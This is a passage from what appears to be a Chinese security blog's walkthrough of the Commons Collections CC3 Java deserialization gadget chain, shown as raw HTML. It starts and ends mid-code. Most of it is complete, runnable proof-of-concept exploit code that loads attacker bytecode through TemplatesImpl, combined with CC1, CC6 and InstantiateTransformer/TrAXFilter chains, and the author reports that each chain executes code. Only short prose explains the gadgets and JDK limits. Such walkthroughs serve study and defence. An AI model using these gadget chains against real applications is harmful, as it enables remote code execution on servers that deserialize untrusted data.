class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ctf),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">proxy</span> <span class="operator">=</span> (InvocationHandler) con.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> con.newInstance(Retention.class,proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机。</p>
<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>也就是CC1的局限，在JDK 8u71后就不能再使用了。</p>
<h3 id="结合CC6"><a href="#结合CC6" class="headerlink" title="结合CC6"></a>结合CC6</h3><h4 id="测试环境：-1"><a href="#测试环境：-1" class="headerlink" title="测试环境："></a>测试环境：</h4><ul>
<li>commons-collections 3.2.1</li>
<li>JDK 8u411</li>
</ul>
<h4 id="CC3（HashMap链）"><a href="#CC3（HashMap链）" class="headerlink" title="CC3（HashMap链）"></a>CC3（HashMap链）</h4><p>POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ctf),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        o.put(outerMap,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机。</p>
<h4 id="CC3（HashSet链）"><a href="#CC3（HashSet链）" class="headerlink" title="CC3（HashSet链）"></a>CC3（HashSet链）</h4><p>和HashMap差不多，POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ctf),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hash.add(outerMap);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hash);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><h4 id="测试环境：-2"><a href="#测试环境：-2" class="headerlink" title="测试环境："></a>测试环境：</h4><ul>
<li>commons-collections 3.2.1</li>
<li>JDK 8u65</li>
</ul>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>ysoserial的CC3的POC没有用InvokerTransformer来执行newTransformer方法，而是用的InstantiateTransformer类：<br><img src="/2024/08/13/CC3/image-20240730173948744.png" alt="image-20240730173948744"></p>
<p><strong>InstantiateTransformer类位于</strong><code>org.apache.commons.collections.functors.InstantiateTransformer</code>，</p>
<p>来看这个类用到的源码</p>
<p>构造方法：</p>
<p><img src="/2024/08/13/CC3/image-20240730174427748.png" alt="image-20240730174427748"></p>
<p>transform方法：</p>
<p><img src="/2024/08/13/CC3/image-20240730174410004.png" alt="image-20240730174410004"></p>
<p>可以看到这里的transform方法就是可以实例化一个类的。</p>
<p><strong>继续看ysoserial的利用链：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">						<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">						<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;</span><br></pre></td></tr></table></figure>

<p>它前面传入了一个<code>TrAXFilter.class</code>，这个<strong>TrAXFilter类位置</strong>是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p>
<p>在<code>TrAXFilter</code>类中，有地方调用了<code>newTransformer()</code>方法：<br><img src="/2024/08/13/CC3/image-20240730175536766.png" alt="image-20240730175536766"></p>
<p>这也就是在ysoserial利用链中传入Templates.class的原因（<strong>Templates接口类位于</strong><code>javax.xml.transform.Templates</code>），现在大概就清楚了，</p>
<p>只要我们将一个设置好了的TemplatesImpl类赋值给一个变量，再将那个变量传进去当做TrAXFilter的参数变量templates的值，这样就会自然调用到TemplatesImpl类的<code>newTransformer()</code>方法，还是简单给个代码，就像如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java_text\\java-1\\out\\production\\java-1\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)&#125;;</span><br></pre></td></tr></table></figure>

<p>就是如上，这样InstantiateTransformer的transformer()方法就可以在获取TrAXFilter类的构造方法后再调用newInstance()方法将这个TrAXFilter类实例化，在实例化的过程中，自然就会调用TemplatesImpl的newTransformer()方法：</p>
<p><img src="/2024/08/13/CC3/image-20240730181220459.png" alt="image-20240730181220459"></p>
<p>那么现在就可以尝试构造了。</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><h5 id="结合CC1-1"><a href="#结合CC1-1" class="headerlink" title="结合CC1"></a>结合CC1</h5><p><strong>CC1的TransformedMap链：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹计算机。</p>
<p><strong>CC1的LazyMap链：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;ctf&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 